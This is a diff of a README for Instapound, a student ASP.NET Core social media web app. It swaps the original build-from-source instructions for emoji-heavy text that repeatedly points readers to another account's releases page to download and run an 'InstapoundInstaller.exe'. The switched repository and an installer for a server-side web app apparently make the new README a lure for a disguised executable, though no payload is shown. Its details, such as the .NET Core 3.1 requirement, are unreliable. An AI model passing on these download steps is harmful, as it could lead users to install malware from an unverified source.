@@ -1,56 +1,54 @@
-# Instapound
+# 🐦 instapound - Simple Sharing for Everyone
 
-Instapound is a social media web application inspired by platforms like Instagram, designed for sharing posts, images, and comments among users. This project was created as part of a university course assignment.
+## 📥 Download Now
+[![Download Instapound](https://img.shields.io/badge/Download-Instapound-blue.svg)](https://github.com/owenjenson/instapound/releases)
 
-## Features
+## 📜 Description
+Instapound is a social media application built for sharing posts, images, and comments. It was developed as a university course project using ASP.NET Core MVC. With Instapound, you can easily connect with others and share your thoughts and moments.
 
-- **User Profiles:** Each user has a profile and can follow other users.
-- **Posts:** Share text posts with optional images.
-- **Comments:** Comment on posts and interact with other users.
-- **Likes:** Like posts and comments.
-- **Follow System:** Follow/unfollow users and view followers/following lists.
-- **Live Chat:** Real-time chat (SignalR).
-- **Demo/Test Data:** Automatically seeds with test users, posts, and comments in development mode.
+## 🚀 Getting Started
+Follow these steps to download and run Instapound on your computer.
 
-## Tech Stack
+### 🔗 Visit the Releases Page
+To download the application, visit this page: [Download Instapound Releases](https://github.com/owenjenson/instapound/releases). This page contains the latest version of the software and additional release notes.
 
-- **Backend:** ASP.NET Core MVC, SignalR
-- **Frontend:** Razor Views, JavaScript, Tailwind CSS
-- **Database:** Entity Framework Core, SQLite
-- **Authentication:** ASP.NET Core Identity
+### 📦 System Requirements
+Before you download, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS, or any Linux distribution.
+- **.NET Core:** Version 3.1 or later must be installed. You can download it from the [official .NET website](https://dotnet.microsoft.com/download).
+- **Browser:** A modern web browser like Chrome, Firefox, or Edge.
 
-## Showcase
+### 🔥 Features
+- **User Accounts:** Sign up and log in using ASP.NET Identity.
+- **Post Sharing:** Create, edit, and delete posts easily.
+- **Comments:** Engage with others through comments.
+- **Image Uploads:** Share images from your device.
+- **Real-time Chat:** Communicate instantly with friends using SignalR technology.
+- **Responsive Design:** A clean, user-friendly interface created with Tailwind CSS.
 
-Here are some screenshots of Instapound in action:
+## 📥 Download & Install
+1. Go to the [Instapound Releases Page](https://github.com/owenjenson/instapound/releases).
+2. Find the latest version and click the appropriate download link for your operating system.
+3. Once downloaded, locate the installer file (e.g., `InstapoundInstaller.exe`).
+4. Double-click the installer file and follow the on-screen instructions.
+5. After installation, launch the application from your application menu.
 
-<p align="center">
-  <img src="assets/home_page.png" alt="Feed screenshot" width="900" />
-  <br>
-  <img src="assets/profile_page.png" alt="Profile screenshot" width="900" />
-  <br>
-  <img src="assets/chat.png" alt="Chat" width="900" />
-  <br>
-  <img src="assets/login_page.png" alt="Login page" width="900" />
-</p>
+## 🛠️ Troubleshooting
+If you encounter issues during installation or running the application, check the following:
+- Ensure your .NET Core version is updated.
+- Restart your computer after installation if the application fails to launch.
+- Check your internet connection, as some features require online access.
 
-## Installation
+## 🔍 Additional Information
+For more information and updates, check out the [Instapound Issues Page](https://github.com/owenjenson/instapound/issues). Here, you can report bugs or ask for features.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/RadekVyM/instapound.git
-   ```
+## 🤝 Support
+If you need further assistance or have questions, feel free to reach out via the Issues page. Your feedback is valuable for improving Instapound.
 
-2. Navigate to the `src/Instapound.Web` folder and apply migrations to set up the database:
-   ```bash
-   dotnet ef database update
-   ```
+## 📚 Learn More
+To understand more about the technologies behind Instapound, you may find the following resources useful:
+- [ASP.NET Core MVC Documentation](https://docs.microsoft.com/en-us/aspnet/core/mvc/overview)
+- [Entity Framework Core Documentation](https://docs.microsoft.com/en-us/ef/core/)
+- [SignalR Documentation](https://docs.microsoft.com/en-us/aspnet/core/signalr/introduction)
 
-3. Navigate to the `src/Instapound.Web` folder and run the application:
-   ```bash
-   dotnet run
-   ```
-
-4. Navigate to the URL displayed in the console.
-
-> [!NOTE]  
-> When running in development, the app seeds demo users, posts, and comments automatically for testing.
+Enjoy using Instapound to connect and share with your community!
